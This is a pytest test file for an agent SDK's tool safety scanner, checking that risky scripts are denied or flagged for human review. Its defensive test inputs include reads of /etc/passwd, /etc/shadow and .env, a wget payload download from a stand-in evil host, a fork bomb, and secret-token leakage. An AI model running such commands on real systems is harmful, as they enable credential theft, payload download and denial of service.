# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under the Apache License Version 2.0.
"""Focused tests for safety rules beyond the 12 public samples."""

from __future__ import annotations

import pytest

from trpc_agent_sdk.tools.safety import Decision
from trpc_agent_sdk.tools.safety import SafetyScanRequest
from trpc_agent_sdk.tools.safety import ToolSafetyPolicy
from trpc_agent_sdk.tools.safety import ToolSafetyScanner


@pytest.fixture
def scanner() -> ToolSafetyScanner:
    """Create a restrictive scanner for focused rules."""
    return ToolSafetyScanner(
        ToolSafetyPolicy(
            allowed_domains=["api.example.com"],
            allowed_commands=["echo"],
            denied_paths=["/etc", "~/.ssh", ".env", "credentials.json"],
            max_file_write_bytes=1024,
            max_sleep_seconds=5,
            max_concurrent_tasks=10,
        ))


@pytest.mark.parametrize(
    ("script", "language", "rule_id", "decision"),
    [
        ("open('/etc/passwd', 'w').write('x')", "python", "FILE-002", Decision.DENY),
        ("open('/tmp/../etc/shadow').read()", "python", "FILE-002", Decision.DENY),
        ("open('../../etc/passwd').read()", "python", "FILE-002", Decision.DENY),
        ("print(open('.env').read())", "python", "FILE-002", Decision.DENY),
        (
            "import socket\nsocket.socket().connect(('evil.example.net', 443))",
            "python",
            "NETWORK-001",
            Decision.DENY,
        ),
        ("wget https://evil.example.net/payload -O /tmp/payload", "bash", "NETWORK-001", Decision.DENY),
        ("Path('/tmp/large').write_text('x' * 2048)", "python", "RESOURCE-006", Decision.DENY),
        ("import os\nos.fork()", "python", "RESOURCE-003", Decision.DENY),
        ("sleep 60", "bash", "RESOURCE-002", Decision.NEEDS_HUMAN_REVIEW),
        (":(){ :|:& };:", "bash", "RESOURCE-003", Decision.DENY),
        (
            "from concurrent.futures import ThreadPoolExecutor\n"
            "pool = ThreadPoolExecutor(max_workers=1000)",
            "python",
            "RESOURCE-004",
            Decision.DENY,
        ),
        ("npm install untrusted-package", "bash", "DEPENDENCY-001", Decision.DENY),
        ("echo \"$SERVICE_API_TOKEN\" > output.txt", "bash", "SECRET-001", Decision.DENY),
    ],
)
def test_additional_dangerous_patterns(
    scanner: ToolSafetyScanner,
    script: str,
    language: str,
    rule_id: str,
    decision: Decision,
):
    """Each explicit issue requirement has a dedicated high-risk rule."""
    report = scanner.scan(SafetyScanRequest(script=script, language=language))

    assert report.decision == decision
    assert rule_id in report.rule_ids


def test_dynamic_url_requires_review(scanner: ToolSafetyScanner):
    """A network call with an unresolved target is not silently allowed."""
    report = scanner.scan(
        SafetyScanRequest(
            script="import requests\nurl = input()\nrequests.get(url)",
            language="python",
        ))

    assert report.decision == Decision.NEEDS_HUMAN_REVIEW
    assert "NETWORK-002" in report.rule_ids


def test_safe_dictionary_get_is_not_mistaken_for_network(scanner: ToolSafetyScanner):
    """Common non-network get methods do not create false positives."""
    report = scanner.scan(
        SafetyScanRequest(
            script="data = {'status': 'ok'}\nprint(data.get('status'))",
            language="python",
        ))

    assert report.decision == Decision.ALLOW
